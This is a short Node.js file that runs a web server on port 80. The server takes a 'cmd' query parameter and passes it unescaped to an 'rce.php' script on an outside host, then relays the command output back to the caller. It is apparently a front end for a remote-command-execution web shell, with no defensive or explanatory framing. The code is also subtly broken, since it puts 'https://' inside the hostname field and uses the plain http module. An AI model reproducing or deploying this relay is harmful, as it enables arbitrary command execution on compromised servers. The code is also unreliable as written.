var http = require('http');
var url = require('url');

http.createServer(function (req, res) {
    var parsedUrl = url.parse(req.url, true);
    var command = parsedUrl.query.cmd;

    if (command) {
        // Make an HTTP request to the PHP script
        var options = {
            hostname: 'https://tzrafi.com',
            path: '/rce.php?cmd=' + command,
            method: 'GET'
        };

        var request = http.request(options, function (response) {
            var output = '';
            response.on('data', function (chunk) {
                output += chunk;
            });
            response.on('end', function () {
                res.writeHead(200, {'Content-Type': 'text/plain'});
                res.end(output);
            });
        });

        request.on('error', function (error) {
            res.writeHead(500, {'Content-Type': 'text/plain'});
            res.end('Error: ' + error.message);
        });

        request.end();
    } else {
        res.writeHead(400, {'Content-Type': 'text/plain'});
        res.end('No command specified');
    }
}).listen(80);
